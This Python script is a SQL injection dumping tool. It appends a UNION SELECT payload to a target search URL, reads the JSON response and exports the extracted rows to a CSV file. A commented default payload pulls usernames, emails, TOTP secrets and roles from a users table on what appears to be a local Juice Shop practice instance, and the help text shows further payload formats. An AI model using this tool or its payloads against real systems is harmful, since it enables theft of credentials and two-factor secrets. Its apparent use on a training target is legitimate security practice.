#!/usr/bin/env python3
import os
import json
import argparse
import requests
import pandas as pd

# Pandas Config
pd.set_option('display.max_columns', None)

# Make sure to escape special chars eg. payload=abc'))--
#	then use the following: payload=abc\'\)')--

# UPDATE: when parseing -u "" must be encapsulated with "" then
# no need to \ escape special char

# Default Variables
#url = "http://localhost:3000//rest/products/search?q=a'))union%20select%20username,email,totpSecret,role,id,6,7,8,9%20from%20users--" 
#output = 'output.csv'
#csv_columns = ['1', '2', '3', '4', '5', '6', '7', '8', '9']

help_msg = """
SQL Injection > HTTP Response Body JSON to CSV exporter
	This tool will determine the column names based on the payload:
		eg. 'union%20select%20colA,colB,colC,null,null,null%20from%20table--
		null,null.null -> specified arbitrary col name to meet the minumum query columns
		colA,colB,colC will be used to remodify the response JSON keys accordingly.

		Please URL encode <space> as %20 and also give the payload in the following format:
			select%20colA,colB%20from%20table
			%20 helps serve as marker to find the col names in the payload.

		Bad example:
			selectcolA,colBfromtable
"""

parser = argparse.ArgumentParser(description=help_msg, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, required=True, help="http://target.com/dir/search?q=")
parser.add_argument('-p', '--payload', type=str, required=True, help="1'))union%20select%20col01,col02%20from%20table--")
parser.add_argument('-o', '--output', required=True, type=str, help="creates a csv file, just specify file name, NOT file extension")
parser.add_argument('-c', '--csv_col', required=False, type=str, help="-c 'col01,col02,col03' | number of columns must be the same as the number of columns in payload. If lesser, specify an arbitrary name as column name to meet the number.")
parser.add_argument('-v', '--verbose', required=False, action='store_true', help="verbose mode...")
parser.add_argument('-a', '--arbitrary', required=True, type=str, help="specify arbitrary col name that will work. eg. 999,null")

args = parser.parse_args()

# User input variables
url = args.url + args.payload
# print(f"url = {url}")

output = args.output
# print(f"output = {output}")


# Get columns from the payload
start_id = url.find('select%20') + 9
end_id = url.find('%20from')  

# print(f"start = {url[start_id]}\nend = {url[end_id]}")

csv_columns = url[start_id:end_id].split(',')
# print(f"csv_col = {csv_columns}")

r = requests.get(url) # r.json() gives the json extracted in response body

r_json = r.json()
# print(f"r_json = \n{json.dumps(r_json)}")


target_key = 'data'

jsonList = r_json[target_key] # list of json docs
# print(f"jsonList = {jsonList}")

# Create an array of dict in { new_col : old_col }
col_lib = []
for i in range(len(csv_columns)):
	old_col = list(jsonList[0].items())[i][0]
	new_col = csv_columns[i]
	col_lib.append({new_col:old_col})

# print(f"col_lib = {col_lib}")

# Convert jsonList.json to pandas dataframe:
# dataframe = pd.DataFrame.from_dict(jsonList, orient="index")
df = pd.json_normalize(jsonList)

df.columns = csv_columns
df.drop(str(args.arbitrary), axis=1, inplace=True)
#print(df.columns)


if args.verbose: print(df)

df.to_csv(args.output,index=False)